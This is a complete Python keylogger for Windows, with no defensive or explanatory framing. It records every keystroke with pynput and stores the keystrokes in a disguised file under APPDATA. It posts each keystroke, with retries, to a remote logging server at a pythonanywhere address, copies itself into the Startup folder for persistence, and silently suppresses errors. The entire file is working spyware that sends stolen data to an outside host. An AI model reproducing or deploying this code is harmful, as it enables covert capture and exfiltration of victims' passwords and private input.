import os
import json
import requests
from pynput import keyboard
from datetime import datetime
import threading
import time
import sys
import shutil

# ===== CONFIGURATION =====
SERVER_URL = "https://sarsmars.pythonanywhere.com/log"  # Replace with your server IP
LOG_FILE = os.path.join(os.getenv("APPDATA"), "system_logs.txt")  # Hidden log file
MAX_RETRIES = 3  # Max attempts to send logs if server is down

# ===== KEYLOGGER =====
def log_to_file(data):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(data + "\n")
    except Exception as e:
        pass  # Avoid crashing if file is locked

def send_to_server(data):
    for _ in range(MAX_RETRIES):
        try:
            response = requests.post(SERVER_URL, data={"log": data}, timeout=5)
            if response.status_code == 200:
                return True
        except:
            time.sleep(2)  # Wait before retrying
    return False

def on_press(key):
    try:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key_str = str(key).replace("'", "")
        log_data = f"[{current_time}] {key_str}"
        
        log_to_file(log_data)  # Always log locally
        
        # Try sending to server in a separate thread (non-blocking)
        threading.Thread(target=send_to_server, args=(log_data,)).start()
        
    except Exception as e:
        pass  # Avoid crashing on key errors

# ===== PERSISTENCE (Auto-Start) =====
def add_to_startup():
    try:
        exe_path = os.path.abspath(sys.argv[0])
        startup_folder = os.path.join(
            os.getenv("APPDATA"), 
            "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
        )
        if not os.path.exists(os.path.join(startup_folder, os.path.basename(exe_path))):
            shutil.copy(exe_path, startup_folder)
    except:
        pass  # Avoid failing if no permissions

# ===== MAIN =====
if __name__ == "__main__":
    add_to_startup()  # Ensure auto-start
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()  # Start keylogger